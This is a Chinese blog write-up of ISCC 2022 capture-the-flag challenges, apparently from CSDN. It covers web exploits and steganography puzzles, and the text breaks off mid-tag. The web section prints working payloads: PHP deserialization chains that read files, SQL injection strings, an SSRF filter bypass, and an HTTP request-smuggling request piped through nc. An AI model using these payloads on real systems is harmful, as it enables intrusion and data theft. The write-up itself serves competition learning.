{"blogid": "125197456", "writerAge": "码龄1年", "writerBlogNum": "33", "writerCollect": "26", "writerComment": "2", "writerFan": "8", "writerGrade": "2级", "writerIntegral": "338", "writerName": "feng?wow", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_125197456.jpg", "writerRankTotal": "48650", "writerRankWeekly": "388196", "writerThumb": "5", "writerVisitNum": "34628", "blog_read_count": "2507", "blog_time": "已于 2022-06-14 23:40:14 修改", "blog_title": "ISCC 2022 wp", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4%E5%8F%8A%E8%BF%87%E7%A8%8B%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4%E5%8F%8A%E8%BF%87%E7%A8%8B%EF%BC%9A\">解题步骤及过程：</a></p>\n<p id=\"%E7%BB%83%E6%AD%A6%E9%A2%98WP%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E7%BB%83%E6%AD%A6%E9%A2%98WP%EF%BC%9A\">练武题WP：</a></p>\n<p id=\"Web%3A-toc\" style=\"margin-left:40px;\"><a href=\"#Web%3A\">Web:</a></p>\n<p id=\"%E5%86%AC%E5%A5%A5%E4%BC%9A%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E5%86%AC%E5%A5%A5%E4%BC%9A%EF%BC%9A\">冬奥会：</a></p>\n<p id=\"%E7%88%B1%E5%9B%BD%E6%95%AC%E4%B8%9A%E5%A5%BD%E9%9D%92%E5%B9%B4-2%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E7%88%B1%E5%9B%BD%E6%95%AC%E4%B8%9A%E5%A5%BD%E9%9D%92%E5%B9%B4-2%EF%BC%9A\">爱国敬业好青年-2：</a></p>\n<p id=\"Pop2022%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Pop2022%EF%BC%9A\">Pop2022：</a></p>\n<p id=\"%E8%BF%99%E6%98%AF%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E8%BF%99%E6%98%AF%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%EF%BC%9A\">这是一道代码审计题：</a></p>\n<p id=\"Easy-SQL%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Easy-SQL%EF%BC%9A\">Easy-SQL：</a></p>\n<p id=\"Findme%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Findme%EF%BC%9A\">Findme：</a></p>\n<p id=\"%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7!%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7!%EF%BC%9A\">让我康康!：</a></p>\n<p id=\"misc%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#misc%EF%BC%9A\">misc：</a></p>\n<p id=\"2022%E5%86%AC%E5%A5%A5%E4%BC%9A%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#2022%E5%86%AC%E5%A5%A5%E4%BC%9A%EF%BC%9A\">2022冬奥会：</a></p>\n<p id=\"%E5%8D%95%E6%9D%BF%E5%B0%8F%E5%B0%86%E8%8B%8F%E7%BF%8A%E9%B8%A3%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E5%8D%95%E6%9D%BF%E5%B0%8F%E5%B0%86%E8%8B%8F%E7%BF%8A%E9%B8%A3%EF%BC%9A\">单板小将苏翊鸣：</a></p>\n<p id=\"%E9%9A%90%E7%A7%98%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E9%9A%90%E7%A7%98%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A\">隐秘的信息：</a></p>\n<p id=\"%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%971%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%971%EF%BC%9A\">藏在星空中的诗1：</a></p>\n<p id=\"%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%972%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%972%EF%BC%9A\">藏在星空中的诗2：</a></p>\n<p id=\"%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB%EF%BC%9A\">降维打击：</a></p>\n<p id=\"%E7%9C%9F%E7%9B%B8%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E7%9C%9F%E7%9B%B8%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%EF%BC%9A\">真相只有一个：</a></p>\n<p id=\"Re%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#Re%EF%BC%9A\">Re：</a></p>\n<p id=\"GetTheTable%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#GetTheTable%EF%BC%9A\">GetTheTable：</a></p>\n<p id=\"Amy's%20Code%3A-toc\" style=\"margin-left:80px;\"><a href=\"#Amy'%20rel=\">Amy's Code:</a></p>\n<p id=\"How_decode%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#How_decode%EF%BC%9A\">How_decode：</a></p>\n<p id=\"Sad%20Code-toc\" style=\"margin-left:80px;\"><a href=\"#Sad%20Code\">Sad Code</a></p>\n<p id=\"VigenereLike%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#VigenereLike%EF%BC%9A\">VigenereLike：</a></p>\n<p id=\"Bob's%20Code%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Bob'%20rel=\">Bob's Code：</a></p>\n<p id=\"Ruststr%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Ruststr%EF%BC%9A\">Ruststr：</a></p>\n<p id=\"Mobile%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#Mobile%EF%BC%9A\">Mobile：</a></p>\n<p id=\"Mobile%20A%3A-toc\" style=\"margin-left:80px;\"><a href=\"#Mobile%20A%3A\">Mobile A:</a></p>\n<p id=\"MoblieB%3A-toc\" style=\"margin-left:80px;\"><a href=\"#MoblieB%3A\">MoblieB:</a></p>\n<p id=\"PWN%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#PWN%EF%BC%9A\">PWN：</a></p>\n<p id=\"create_id-toc\" style=\"margin-left:80px;\"><a href=\"#create_id\">create_id</a></p>\n<p id=\"sim_treasure%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#sim_treasure%EF%BC%9A\">sim_treasure：</a></p>\n<p id=\"untidy_note%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#untidy_note%EF%BC%9A\">untidy_note：</a></p>\n<p id=\"%E8%B7%B3%E4%B8%80%E8%B7%B3%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#%E8%B7%B3%E4%B8%80%E8%B7%B3%EF%BC%9A\">跳一跳：</a></p>\n<p id=\"%E6%93%82%E5%8F%B0%E9%A2%98WP%EF%BC%9A-toc\" style=\"margin-left:0px;\"><a href=\"#%E6%93%82%E5%8F%B0%E9%A2%98WP%EF%BC%9A\">擂台题WP：</a></p>\n<p id=\"MISC%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#MISC%EF%BC%9A\">MISC：</a></p>\n<p id=\"666%3A-toc\" style=\"margin-left:80px;\"><a href=\"#666%3A\">666:</a></p>\n<p id=\"Web%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#Web%EF%BC%9A\">Web：</a></p>\n<p id=\"Melody%3A-toc\" style=\"margin-left:80px;\"><a href=\"#Melody%3A\">Melody:</a></p>\n<p id=\"Ping2rce%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Ping2rce%EF%BC%9A\">Ping2rce：</a></p>\n<p id=\"PWN%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#PWN%EF%BC%9A\">PWN：</a></p>\n<p id=\"Ezuaf%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Ezuaf%EF%BC%9A\">Ezuaf：</a></p>\n<p id=\"RE%EF%BC%9A-toc\" style=\"margin-left:40px;\"><a href=\"#RE%EF%BC%9A\">RE：</a></p>\n<p id=\"Encode%EF%BC%9A-toc\" style=\"margin-left:80px;\"><a href=\"#Encode%EF%BC%9A\">Encode：</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<h1 id=\"%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4%E5%8F%8A%E8%BF%87%E7%A8%8B%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">解题步骤及过程：</h1>\n<h1 id=\"%E7%BB%83%E6%AD%A6%E9%A2%98WP%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">练武题WP：</h1>\n<h2 id=\"Web%3A\" style=\"margin-left:0;text-align:justify;\">Web:</h2>\n<h3 id=\"%E5%86%AC%E5%A5%A5%E4%BC%9A%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">冬奥会：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">点进后发现php代码，数组绕过即可。</p>\n<pre><code>Payload：\n\n?Information={\"year\":\"x\",\"items\":[0,[],0]}</code></pre>\n<h3 id=\"%E7%88%B1%E5%9B%BD%E6%95%AC%E4%B8%9A%E5%A5%BD%E9%9D%92%E5%B9%B4-2%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">爱国敬业好青年-2：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">手动扫了一下，发先有一个/change目录，显示了一个Open，肯定是有用的。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">既然是爱国敬业好青年，我先尝试了北京的经纬度，又尝试了北京天安门的经纬度。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"315\" src=\"..\\..\\static\\image\\783df3325f6f4c99adaecc1d70ed8f8e.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">现在要想一下如何提交，肯定不是初始页面，存在挟持。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现存在/flag目录，于是尝试提交，但很多次都没成功，必须先访问change，回显Open后在提交。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"586\" src=\"..\\..\\static\\image\\6eac47ba66fe4948afd6e3d55a246a63.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">说实话，脑洞有亿些大。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h3 id=\"Pop2022%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Pop2022：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">反序列化，找到了原题，直接写。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Exp：</p>\n<pre><code>&lt;?php\n\nclass Road_is_Long{\n\n    public $page;\n\n    public $string;\n\n    public function __construct($file='index.php'){\n\n        $this-&gt;page = $file;\n\n    }\n\n    public function __toString(){\n\n        return $this-&gt;string-&gt;page;\n\n    }\n\n\n\n    public function __wakeup(){\n\n        if(preg_match(\"/file|ftp|http|https|gopher|dict|\\.\\./i\", $this-&gt;page)) {\n\n            echo \"You can Not Enter 2022\";\n\n            $this-&gt;page = \"index.php\";\n\n        }\n\n    }\n\n}\n\n\n\nclass Try_Work_Hard{\n\n    protected $var = 'flag.php';\n\n    public function append($value){\n\n        include($value);\n\n    }\n\n    public function __invoke(){\n\n        $this-&gt;append($this-&gt;var);\n\n    }\n\n}\n\n\n\nclass Make_a_Change{\n\n    public $effort;\n\n\n\n    public function __get($key){\n\n        $function = $this-&gt;effort;\n\n        return $function();\n\n    }\n\n}\n\n\n\n$mac = new Make_a_Change();\n\n$mac-&gt;effort = new Try_Work_Hard();\n\n\n\n$ril1 = new Road_is_Long();\n\n$ril1-&gt;string = $mac;\n\n\n\n$ril2 = new Road_is_Long();\n\n$ril2-&gt;page = $ril1;\n\n\n\necho urlencode(serialize($ril2));</code></pre>\n<pre><code>paylod:\nwish=O%3A12%3A\"Road_is_Long\"%3A2%3A%7Bs%3A4%3A\"page\"%3BO%3A12%3A\"Road_is_Long\"%3A2%3A%7Bs%3A4%3A\"page\"%3BN%3Bs%3A6%3A\"string\"%3BO%3A13%3A\"Make_a_Change\"%3A1%3A%7Bs%3A6%3A\"effort\"%3BO%3A13%3A\"Try_Work_Hard\"%3A1%3A%7Bs%3A6%3A\"%00%2A%00var\"%3Bs%3A57%3A\"php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php\"%3B%7D%7D%7Ds%3A6%3A\"string\"%3BN%3B%7D</code></pre>\n<h3 id=\"%E8%BF%99%E6%98%AF%E4%B8%80%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">这是一道代码审计题：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">打开后访问/index显示404，查看cookie后发现存在login，试了一下login=1，或者删除也行。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"124\" src=\"..\\..\\static\\image\\08e543b5da374f46a0c2e87eebe88af4.png\" width=\"506\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后加上后缀?url=127.0.0.1,发现存在./static/code.txt文件。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"314\" src=\"..\\..\\static\\image\\b5c65878c3bb4845a44b92ffdc59a894.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">打开后发现base100加密后的代码。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到代码：</p>\n<pre><code>def geneSign():\n\n    if(control_key==1):\n\n        return render_template(\"index.html\")\n\n    else:\n\n        return \"You have not access to this page!\"\n\n\n\ndef check_ssrf(url):\n\n    hostname = urlparse(url).hostname\n\n    try:\n\n        if not re.match('https?://(?:[-\\w.]|(?:%[\\da-fA-F]{2}))+', url):\n\n            if not re.match('https?://@(?:[-\\w.]|(?:%[\\da-fA-F]{2}))+', url):\n\n                raise BaseException(\"url format error\")\n\n        if  re.match('https?://@(?:[-\\w.]|(?:%[\\da-fA-F]{2}))+', url):\n\n            if judge_ip(hostname):\n\n                return True\n\n            return False, \"You not get the right clue!\"\n\n        else:\n\n            ip_address = socket.getaddrinfo(hostname,'http')[0][4][0]\n\n            if is_inner_ipaddress(ip_address):\n\n                return False,\"inner ip address attack\"\n\n            else:\n\n                return False, \"You not get the right clue!\"\n\n    except BaseException as e:\n\n        return False, str(e)\n\n    except:\n\n        return False, \"unknow error\"\n\n\n\ndef ip2long(ip_addr):\n\n    return struct.unpack(\"!L\", socket.inet_aton(ip_addr))[0]\n\n\n\ndef is_inner_ipaddress(ip):\n\n    ip = ip2long(ip)\n\n    print(ip)\n\n    return ip2long('127.0.0.0') &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long('10.0.0.0') &gt;&gt; 24 == ip &gt;&gt; 24 or ip2long('172.16.0.0') &gt;&gt; 20 == ip &gt;&gt; 20 or ip2long('192.168.0.0') &gt;&gt; 16 == ip &gt;&gt; 16 or ip2long('0.0.0.0') &gt;&gt; 24 == ip &gt;&gt; 24\n\n\n\ndef waf1(ip):\n\n    forbidden_list = [ '.', '0', '1', '2', '7']\n\n    for word in forbidden_list:\n\n        if ip and word:\n\n            if word in ip.lower():\n\n                return True\n\n    return False\n\n\n\ndef judge_ip(ip):\n\n    if(waf1(ip)):\n\n        return Fasle\n\n    else:\n\n        addr = addr.encode(encoding = \"utf-8\")\n\n        ipp = base64.encodestring(addr)\n\n        ipp = ipp.strip().lower().decode()\n\n        if(ip==ipp):\n\n            global control_key\n\n            control_key = 1\n\n            return True\n\n        else:\n\n            return False</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现存在sstf，构造url= <span style=\"color:#0563c1;\"><u><a href=\"\">http://@MTI3LjAuMC4x</a></u></span>。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"152\" src=\"..\\..\\static\\image\\4dd66df6893d47d48110972aa2182037.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后利用这个cookie和路径。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"304\" src=\"..\\..\\static\\image\\cc8d661dc49a424dbbcde9a646b7eaa8.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">试了许多，到最后xxe成功了。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"236\" src=\"..\\..\\static\\image\\7205d93b5f664f83a8e781d7ceb1d3d5.png\" width=\"567\"/></p>\n<p></p>\n<h3 id=\"Easy-SQL%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Easy-SQL：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">找到了一道类似的题。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">网址：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><span style=\"color:#0563c1;\"><u><a href=\"https://blog.csdn.net/mochu7777777/article/details/109541284\" title=\"[2020网络安全管理职业技能竞赛全国选拔赛]ezsqli_末 初的博客-CSDN博客\">[2020网络安全管理职业技能竞赛全国选拔赛]ezsqli_末 初的博客-CSDN博客</a></u></span></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">先尝试了几下：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"514\" src=\"..\\..\\static\\image\\057ab4c0c83343f5aeacbf8addd9fd25.png\" width=\"340\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"508\" src=\"..\\..\\static\\image\\e722570ae7a342578ffedc0a1892df66.png\" width=\"510\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">想办法得到emali，select被过滤，利用table找email。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"363\" src=\"..\\..\\static\\image\\4e55e339fed54bf797d122fa91eecae4.png\" width=\"378\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">尝试了一会发现ypHeMPardErE.zip，直接访问即可得到。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现zip里边有一个index.php代码文件，查看代码，发现和网址中的代码一样。</p>\n<pre><code>payload：\n\nPOST：username=1'/**/union/**/select/**/1,0x61646d696e,3%23&amp;passwd=3</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h3 id=\"Findme%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Findme：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">进入网站，f12查看存在unser.php文件，直接访问。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">存在反序列化漏洞，利用php原生类，遍历目录。</p>\n<pre><code>EXP：\n\n&lt;?php\n\nclass a{\n\n    public $un0='DirectoryIterator';\n\n    public $un1='glob://f*';\n\n    public $un2;\n\n    public $un3='unserialize';\n\n    public $un4;\n\n  \n\n}\n\n$a = new a();\n\necho serialize($a);</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后传入即可。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"532\" src=\"..\\..\\static\\image\\675de6c0bd784ffe9543c5f5ad57f001.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现存在flllHL91244ggg-SecR1et.txt文件。访问即可得到flag。 </p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"244\" src=\"..\\..\\static\\image\\09609cb427e848c9b56885811d9d1ee0.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h3 id=\"%E8%AE%A9%E6%88%91%E5%BA%B7%E5%BA%B7!%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\"><span style=\"color:#333333;\">让我康康!：</span></h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">多次尝试漏洞类型，发现了flag在/fl4g中。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"246\" src=\"..\\..\\static\\image\\1c1b5ff83e9041d99ad7a8db9a87b27e.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:left;\">发现了后端服务器类型为<span style=\"color:#333333;\">gunicorn/20.0.0</span><span style=\"color:#333333;\">，网上搜索相关漏洞，发现存在其存在服务器差异，可以利用服务器的差异来运用高级漏洞http走私，还顺便看了一些文章。</span></p>\n<p style=\"margin-left:0;\"></p>\n<pre><code>payload\n\nGET / HTTP/1.1\\r\\n\n\nHost: 127.0.0.1\\r\\n\n\n\\r\\n\n\nContent-Length: 67\\r\\n\n\nSec-Websocket-Key1: x\\r\\n\n\n\\r\\n\n\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\n\n\nHost: localhost\\r\\n\n\nContent-Length: 35\\r\\n\n\n\\r\\n\n\nGET / HTTP/1.1\\r\\n\n\nHost: 127.0.0.1\\r\\n\n\n\\r\\n</code></pre>\n<p style=\"margin-left:.0001pt;text-align:left;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后回显只有本地人才能的获得flag，加一个secr3t_ip: 127.0.0.1即可。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">可以用nc直接得到flag。</p>\n<pre><code>echo -en \"POST / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: 76\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxPOST /fl4g HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 55\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nHost: 127.0.0.1:80\\r\\n\\r\\n\" | nc 59.110.159.206 7020</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Flag为ISCC{Let9_M1_sE1_s0m1ThInG_gO0dhhh}</p>\n<h2 id=\"misc%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">misc：</h2>\n<h3 id=\"2022%E5%86%AC%E5%A5%A5%E4%BC%9A%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">2022冬奥会：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">打开发现flag文件有密码，然后一张图片。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"272\" src=\"..\\..\\static\\image\\91f5a3347a2f4aeca149909ae4e9d5bf.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">猜测密码为灯笼。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">利用记事本打开即可。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"282\" src=\"..\\..\\static\\image\\8df31e9615a244c5a88660b8a1af400b.png\" width=\"567\"/></p>\n<h3 id=\"%E5%8D%95%E6%9D%BF%E5%B0%8F%E5%B0%86%E8%8B%8F%E7%BF%8A%E9%B8%A3%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">单板小将苏翊鸣：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Zip文件，放到010Editor中，修改一下信息</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"186\" src=\"..\\..\\static\\image\\c1e71c2fc699467a963372455846efb5.png\" width=\"583\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"286\" src=\"..\\..\\static\\image\\19cb82b8a4f940009a699168113c3c79.png\" width=\"378\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">扫描二维码然后解密，得到解压密码：15942</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后输入即可得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h3 id=\"%E9%9A%90%E7%A7%98%E7%9A%84%E4%BF%A1%E6%81%AF%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">隐秘的信息：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">现在附件后会发现有加密，题目给的有一穿加密字符，base64试一下。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"318\" src=\"..\\..\\static\\image\\c103d2da9a4740ec8aff3492377a995b.png\" width=\"330\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">当作密码尝试一下，成功进入，发现一张图片，用stegsolve打开，查看lsb通道。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现啥都没有，尝试了好多方法，都不行，感觉就应该是lsb通道。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"138\" src=\"..\\..\\static\\image\\8cf7e06cbe2243cca20a3b2c2bdbc712.png\" width=\"492\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现前几行有点特别，放进hex转码一下。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">刚开始乱码，然后一个一个删，尝试。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"207\" src=\"..\\..\\static\\image\\f5ba73478daa40239e226e1cc5a108f2.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到flag。</p>\n<h3 id=\"%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%971%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">藏在星空中的诗1：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"221\" src=\"..\\..\\static\\image\\e04103534b6f4bba8f73a2be9c8f5a22.png\" width=\"378\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">按照五角星的画法明显顺序是13524.</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">将Poem里的东西排列一下即是密码，然后对比。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"338\" src=\"..\\..\\static\\image\\699480eef605497c8d885108d04270a3.png\" width=\"378\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">即可得到flag。</p>\n<h3 id=\"%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%972%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">藏在星空中的诗2：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">打开就一个txt文件，其他啥都没有猜测文件即使flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">开头肯定是ISCC，发现六个为一组，而且前两个一样。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"424\" src=\"..\\..\\static\\image\\4375af9f933448c2ae1528b221153771.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">和Escape/unEscape编码类似，本来想直接猜测对应字母，发现少了许多，想起来第一题中有一个xls文件可以对应，因为知道了开头的ISCC{和结尾的}，为了省事直接从括号里边开始。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"264\" src=\"..\\..\\static\\image\\f38a991c984b4f46bd902749ffc2038d.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">对应出解码一下便是flag</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h3 id=\"%E9%99%8D%E7%BB%B4%E6%89%93%E5%87%BB%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">降维打击：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到图片后先用binwalk看一下。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">命令：binwalk 图片（图片要放在binwalk下）</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"204\" src=\"..\\..\\static\\image\\cd9549c128514f9780736dcbc68e3763.png\" width=\"378\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后分离。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">命令：dd if=1.png of=3.jpg skip=290500 bs=1</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"306\" 